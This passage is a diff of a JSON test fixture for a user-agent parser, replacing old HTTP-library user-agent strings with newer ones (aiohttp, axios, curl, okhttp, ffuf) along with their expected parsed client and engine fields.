+        "size": null
+      },
+      "type": "unknown",
+      "ismobile": false,
+      "istv": false,
+      "dualOrientation": null,
+      "simCount": 0,
+      "bits": 0
+    },
+    "client": {
+      "name": "aiohttp",
+      "modus": null,
+      "version": "3.13.4",
+      "manufacturer": "unknown",
+      "type": "library",
+      "isbot": false,
+      "bits": 0
+    },
+    "os": {
+      "name": null,
+      "marketingName": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "bits": 0
+    },
+    "engine": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown"
+    }
+  },
+  {
+    "headers": {
+      "user-agent": "curl/8.21.0"
+    },
+    "device": {
+      "architecture": "",
+      "deviceName": null,
+      "marketingName": null,
+      "manufacturer": "unknown",
+      "brand": "unknown",
+      "display": {
+        "width": null,
+        "height": null,
+        "touch": false,
+        "size": null
+      },
+      "type": "unknown",
+      "ismobile": false,
+      "istv": false,
+      "dualOrientation": null,
+      "simCount": 0,
+      "bits": 0
+    },
+    "client": {
+      "name": "cURL",
+      "modus": null,
+      "version": "8.21.0",
+      "manufacturer": "unknown",
+      "type": "library",
+      "isbot": false,
+      "bits": 0
+    },
+    "os": {
+      "name": null,
+      "marketingName": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "bits": 0
+    },
+    "engine": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown"
+    }
+  },
+  {
+    "headers": {
+      "user-agent": "curlie-linkcheck/1.0 (eenmalige controle of een oude Curlie-link nog werkt; 1 verzoek per domein, geen crawl)"
+    },
+    "device": {
+      "architecture": "",
+      "deviceName": null,
+      "marketingName": null,
+      "manufacturer": "unknown",
+      "brand": "unknown",
+      "display": {
+        "width": null,
+        "height": null,
+        "touch": false,
+        "size": null
+      },
+      "type": "unknown",
+      "ismobile": false,
+      "istv": false,
+      "dualOrientation": null,
+      "simCount": 0,
+      "bits": 0
+    },
+    "client": {
+      "name": "cURL",
+      "modus": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "type": "library",
+      "isbot": false,
+      "bits": 0
+    },
+    "os": {
+      "name": null,
+      "marketingName": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "bits": 0
+    },
+    "engine": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown"
+    }
+  },
+  {
+    "headers": {
+      "user-agent": "Python/3.12 aiohttp/3.14.3"
+    },
+    "device": {
+      "architecture": "",
+      "deviceName": null,
+      "marketingName": null,
+      "manufacturer": "unknown",
+      "brand": "unknown",
+      "display": {
+        "width": null,
+        "height": null,
+        "touch": false,
+        "size": null
+      },
+      "type": "unknown",
+      "ismobile": false,
+      "istv": false,
+      "dualOrientation": null,
+      "simCount": 0,
+      "bits": 0
+    },
+    "client": {
+      "name": "aiohttp",
+      "modus": null,
+      "version": "3.14.3",
+      "manufacturer": "unknown",
+      "type": "library",
+      "isbot": false,
+      "bits": 0
+    },
+    "os": {
+      "name": null,
+      "marketingName": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "bits": 0
+    },
+    "engine": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown"
+    }
+  },
+  {
+    "headers": {
+      "user-agent": "curl-proxy/1.0"
+    },
+    "device": {
+      "architecture": "",
+      "deviceName": null,
+      "marketingName": null,
+      "manufacturer": "unknown",
+      "brand": "unknown",
+      "display": {
+        "width": null,
+        "height": null,
+        "touch": false,
+        "size": null
+      },
+      "type": "unknown",
+      "ismobile": false,
+      "istv": false,
+      "dualOrientation": null,
+      "simCount": 0,
+      "bits": 0
+    },
+    "client": {
+      "name": "cURL",
+      "modus": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "type": "library",
+      "isbot": false,
+      "bits": 0
+    },
+    "os": {
+      "name": null,
+      "marketingName": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "bits": 0
+    },
+    "engine": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown"
+    }
+  },
+  {
+    "headers": {
+      "user-agent": "axios/1.18.1"
+    },
+    "device": {
+      "architecture": "",
+      "deviceName": null,
+      "marketingName": null,
+      "manufacturer": "unknown",
+      "brand": "unknown",
+      "display": {
+        "width": null,
+        "height": null,
+        "touch": false,
+        "size": null
+      },
+      "type": "unknown",
+      "ismobile": false,
+      "istv": false,
+      "dualOrientation": null,
+      "simCount": 0,
+      "bits": 0
+    },
+    "client": {
+      "name": "Axios",
+      "modus": null,
+      "version": "1.18.1",
+      "manufacturer": "unknown",
+      "type": "library",
+      "isbot": false,
+      "bits": 0
+    },
+    "os": {
+      "name": null,
+      "marketingName": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "bits": 0
+    },
+    "engine": {
+      "name": "WebKit",
+      "version": null,
+      "manufacturer": "apple"
+    }
+  },
+  {
+    "headers": {
+      "user-agent": "Faraday v2.14.3"
     },
     "device": {
       "architecture": "",
@@ -3535,7 +1420,7 @@
     "client": {
       "name": "Faraday",
       "modus": null,
-      "version": "0.13.1",
+      "version": "2.14.3",
       "manufacturer": "unknown",
       "type": "library",
       "isbot": false,
@@ -3556,7 +1441,7 @@
   },
   {
     "headers": {
-      "user-agent": "Guzzle/3.8.1 curl/7.19.7 PHP/5.5.21"
+      "user-agent": "axios/1.19.0"
     },
     "device": {
       "architecture": "",
@@ -3578,9 +1463,9 @@
       "bits": 0
     },
     "client": {
-      "name": "Guzzle Http Client",
+      "name": "Axios",
       "modus": null,
-      "version": "3.8.1",
+      "version": "1.19.0",
       "manufacturer": "unknown",
       "type": "library",
       "isbot": false,
@@ -3594,14 +1479,14 @@
       "bits": 0
     },
     "engine": {
-      "name": null,
+      "name": "WebKit",
       "version": null,
-      "manufacturer": "unknown"
+      "manufacturer": "apple"
     }
   },
   {
     "headers": {
-      "user-agent": "okhttp/2.1.0"
+      "user-agent": "okhttp/5.5.0"
     },
     "device": {
       "architecture": "",
@@ -3625,7 +1510,7 @@
     "client": {
       "name": "OkHttp",
       "modus": null,
-      "version": "2.1.0",
+      "version": "5.5.0",
       "manufacturer": "unknown",
       "type": "library",
       "isbot": false,
@@ -3646,7 +1531,7 @@
   },
   {
     "headers": {
-      "user-agent": "Mechanize/2.7.2 Ruby/2.1.1p76 (http://github.com/sparklemotion/mechanize/)"
+      "user-agent": "go-resty/2.17.2 (https://github.com/go-resty/resty)"
     },
     "device": {
       "architecture": "",
@@ -3668,99 +1553,9 @@
       "bits": 0
     },
     "client": {
-      "name": "Mechanize",
+      "name": "Resty",
       "modus": null,
-      "version": "2.7.2",
-      "manufacturer": "unknown",
-      "type": "library",
-      "isbot": false,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": "WebKit",
-      "version": null,
-      "manufacturer": "apple"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "Mechanize/2.7.3 Ruby/2.1.5p273 (http://github.com/sparklemotion/mechanize/)"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "Mechanize",
-      "modus": null,
-      "version": "2.7.3",
-      "manufacturer": "unknown",
-      "type": "library",
-      "isbot": false,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": "WebKit",
-      "version": null,
-      "manufacturer": "apple"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "HTTPClient/1.0 (2.6.0.1, ruby 2.1.5 (2014-11-13))"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "ruby",
-      "modus": null,
-      "version": "2.1.5",
+      "version": "2.17.2",
       "manufacturer": "unknown",
       "type": "library",
       "isbot": false,
@@ -3781,7 +1576,7 @@
   },
   {
     "headers": {
-      "user-agent": "Faraday v0.9.1"
+      "user-agent": "okhttp/5.4.0"
     },
     "device": {
       "architecture": "",
@@ -3803,9 +1598,54 @@
       "bits": 0
     },
     "client": {
-      "name": "Faraday",
+      "name": "OkHttp",
       "modus": null,
-      "version": "0.9.1",
+      "version": "5.4.0",
+      "manufacturer": "unknown",
+      "type": "library",
+      "isbot": false,
+      "bits": 0
+    },
+    "os": {
+      "name": "Android",
+      "marketingName": "Android",
+      "version": null,
+      "manufacturer": "google",
+      "bits": 0
+    },
+    "engine": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown"
+    }
+  },
+  {
+    "headers": {
+      "user-agent": "Python/3.11 aiohttp/3.14.3"
+    },
+    "device": {
+      "architecture": "",
+      "deviceName": null,
+      "marketingName": null,
+      "manufacturer": "unknown",
+      "brand": "unknown",
+      "display": {
+        "width": null,
+        "height": null,
+        "touch": false,
+        "size": null
+      },
+      "type": "unknown",
+      "ismobile": false,
+      "istv": false,
+      "dualOrientation": null,
+      "simCount": 0,
+      "bits": 0
+    },
+    "client": {
+      "name": "aiohttp",
+      "modus": null,
+      "version": "3.14.3",
       "manufacturer": "unknown",
       "type": "library",
       "isbot": false,
@@ -3826,97 +1666,7 @@
   },
   {
     "headers": {
-      "user-agent": "Mechanize/2.7.3 Ruby/2.2.0p0 (http://github.com/sparklemotion/mechanize/)"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "Mechanize",
-      "modus": null,
-      "version": "2.7.3",
-      "manufacturer": "unknown",
-      "type": "library",
-      "isbot": false,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": "WebKit",
-      "version": null,
-      "manufacturer": "apple"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "node-superagent/0.18.2"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "superagent",
-      "modus": null,
-      "version": "0.18.2",
-      "manufacturer": "unknown",
-      "type": "library",
-      "isbot": false,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "conky-curl/1.1"
+      "user-agent": "curl/8.22.0"
     },
     "device": {
       "architecture": "",
@@ -3940,7 +1690,7 @@
     "client": {
       "name": "cURL",
       "modus": null,
-      "version": "1.1.0",
+      "version": "8.22.0",
       "manufacturer": "unknown",
       "type": "library",
       "isbot": false,
@@ -3961,7 +1711,7 @@
   },
   {
     "headers": {
-      "user-agent": "Mechanize/2.5.1 Ruby/1.9.3p194 (http://github.com/tenderlove/mechanize/)"
+      "user-agent": "Python/3.14 aiohttp/3.14.3"
     },
     "device": {
       "architecture": "",
@@ -3983,9 +1733,99 @@
       "bits": 0
     },
     "client": {
-      "name": "Mechanize",
+      "name": "aiohttp",
       "modus": null,
-      "version": "2.5.1",
+      "version": "3.14.3",
+      "manufacturer": "unknown",
+      "type": "library",
+      "isbot": false,
+      "bits": 0
+    },
+    "os": {
+      "name": null,
+      "marketingName": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "bits": 0
+    },
+    "engine": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown"
+    }
+  },
+  {
+    "headers": {
+      "user-agent": "JFrogArtifactory/7.146.25"
+    },
+    "device": {
+      "architecture": "",
+      "deviceName": null,
+      "marketingName": null,
+      "manufacturer": "unknown",
+      "brand": "unknown",
+      "display": {
+        "width": null,
+        "height": null,
+        "touch": false,
+        "size": null
+      },
+      "type": "unknown",
+      "ismobile": false,
+      "istv": false,
+      "dualOrientation": null,
+      "simCount": 0,
+      "bits": 0
+    },
+    "client": {
+      "name": "Artifactory",
+      "modus": null,
+      "version": "7.146.25",
+      "manufacturer": "unknown",
+      "type": "library",
+      "isbot": false,
+      "bits": 0
+    },
+    "os": {
+      "name": null,
+      "marketingName": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "bits": 0
+    },
+    "engine": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown"
+    }
+  },
+  {
+    "headers": {
+      "user-agent": "axios/1.20.0"
+    },
+    "device": {
+      "architecture": "",
+      "deviceName": null,
+      "marketingName": null,
+      "manufacturer": "unknown",
+      "brand": "unknown",
+      "display": {
+        "width": null,
+        "height": null,
+        "touch": false,
+        "size": null
+      },
+      "type": "unknown",
+      "ismobile": false,
+      "istv": false,
+      "dualOrientation": null,
+      "simCount": 0,
+      "bits": 0
+    },
+    "client": {
+      "name": "Axios",
+      "modus": null,
+      "version": "1.20.0",
       "manufacturer": "unknown",
       "type": "library",
       "isbot": false,
@@ -4006,7 +1846,7 @@
   },
   {
     "headers": {
-      "user-agent": "HTTPClient/1.0 (2.6.0.1, ruby 2.2.0 (2014-12-25))"
+      "user-agent": "Python/3.14 aiohttp/3.14.4"
     },
     "device": {
       "architecture": "",
@@ -4028,9 +1868,9 @@
       "bits": 0
     },
     "client": {
-      "name": "ruby",
+      "name": "aiohttp",
       "modus": null,
-      "version": "2.2.0",
+      "version": "3.14.4",
       "manufacturer": "unknown",
       "type": "library",
       "isbot": false,
@@ -4051,7 +1891,7 @@
   },
   {
     "headers": {
-      "user-agent": "Faraday v0.8.7"
+      "user-agent": "Python/3.10 aiohttp/3.14.3"
     },
     "device": {
       "architecture": "",
@@ -4073,9 +1913,9 @@
       "bits": 0
     },
     "client": {
-      "name": "Faraday",
+      "name": "aiohttp",
       "modus": null,
-      "version": "0.8.7",
+      "version": "3.14.3",
       "manufacturer": "unknown",
       "type": "library",
       "isbot": false,
@@ -4096,7 +1936,7 @@
   },
   {
     "headers": {
-      "user-agent": "Guzzle/3.9.2 curl/7.26.0 PHP/5.5.20-1~dotdeb.1"
+      "user-agent": "KlHttpClientCurl/26.0.0.748"
     },
     "device": {
       "architecture": "",
@@ -4118,9 +1958,9 @@
       "bits": 0
     },
     "client": {
-      "name": "Guzzle Http Client",
+      "name": "KlHttpClientCurl",
       "modus": null,
-      "version": "3.9.2",
+      "version": "26.0.0.748",
       "manufacturer": "unknown",
       "type": "library",
       "isbot": false,
@@ -4141,7 +1981,7 @@
   },
   {
     "headers": {
-      "user-agent": "HTTP-Tiny/0.046"
+      "user-agent": "Python/3.13 aiohttp/3.14.3"
     },
     "device": {
       "architecture": "",
@@ -4163,9 +2003,9 @@
       "bits": 0
     },
     "client": {
-      "name": "HTTP:Tiny",
+      "name": "aiohttp",
       "modus": null,
-      "version": "0.046.0",
+      "version": "3.14.3",
       "manufacturer": "unknown",
       "type": "library",
       "isbot": false,
@@ -4186,7 +2026,7 @@
   },
   {
     "headers": {
-      "user-agent": "MoJoBot/0.1 libwww-perl/5.805"
+      "user-agent": "Python/3.11 aiohttp/3.14.4"
     },
     "device": {
       "architecture": "",
@@ -4208,9 +2048,9 @@
       "bits": 0
     },
     "client": {
-      "name": "Perl",
+      "name": "aiohttp",
       "modus": null,
-      "version": "5.805.0",
+      "version": "3.14.4",
       "manufacturer": "unknown",
       "type": "library",
       "isbot": false,
@@ -4231,7 +2071,7 @@
   },
   {
     "headers": {
-      "user-agent": "LWP::Simple/5.827 libwww-perl/5.831"
+      "user-agent": "Python/3.10 aiohttp/3.14.5"
     },
     "device": {
       "architecture": "",
@@ -4253,9 +2093,9 @@
       "bits": 0
     },
     "client": {
-      "name": "Perl",
+      "name": "aiohttp",
       "modus": null,
-      "version": "5.831.0",
+      "version": "3.14.5",
       "manufacturer": "unknown",
       "type": "library",
       "isbot": false,
@@ -4276,7 +2116,7 @@
   },
   {
     "headers": {
-      "user-agent": "LWP-TimeChecklibwww-perl/5.51"
+      "user-agent": "Python/3.12 aiohttp/3.14.5"
     },
     "device": {
       "architecture": "",
@@ -4298,9 +2138,9 @@
       "bits": 0
     },
     "client": {
-      "name": "Perl",
+      "name": "aiohttp",
       "modus": null,
-      "version": "5.51.0",
+      "version": "3.14.5",
       "manufacturer": "unknown",
       "type": "library",
       "isbot": false,
@@ -4321,7 +2161,7 @@
   },
   {
     "headers": {
-      "user-agent": "lwp-rget/2.04 libwww-perl/5.803"
+      "user-agent": "Python/3.11 aiohttp/3.14.5"
     },
     "device": {
       "architecture": "",
@@ -4343,9 +2183,9 @@
       "bits": 0
     },
     "client": {
-      "name": "Perl",
+      "name": "aiohttp",
       "modus": null,
-      "version": "5.803.0",
+      "version": "3.14.5",
       "manufacturer": "unknown",
       "type": "library",
       "isbot": false,
@@ -4366,7 +2206,7 @@
   },
   {
     "headers": {
-      "user-agent": "lwp-request/5.822 libwww-perl/5.823"
+      "user-agent": "curl/8.0"
     },
     "device": {
       "architecture": "",
@@ -4388,9 +2228,9 @@
       "bits": 0
     },
     "client": {
-      "name": "Perl",
+      "name": "cURL",
       "modus": null,
-      "version": "5.823.0",
+      "version": "8.0.0",
       "manufacturer": "unknown",
       "type": "library",
       "isbot": false,
@@ -4411,7 +2251,7 @@
   },
   {
     "headers": {
-      "user-agent": "lwp-request/5.818 libwww-perl/5.820"
+      "user-agent": "Fuzz Faster U Fool v1.4.0-dev"
     },
     "device": {
       "architecture": "",
@@ -4433,54 +2273,9 @@
       "bits": 0
     },
     "client": {
-      "name": "Perl",
+      "name": "FFUF",
       "modus": null,
-      "version": "5.820.0",
-      "manufacturer": "unknown",
-      "type": "library",
-      "isbot": false,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "lwp-download/Revision: 2.1  libwww-perl/5.75"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "Perl",
-      "modus": null,
-      "version": "5.75.0",
+      "version": "1.4.0-dev",
       "manufacturer": "unknown",
       "type": "library",
       "isbot": false,
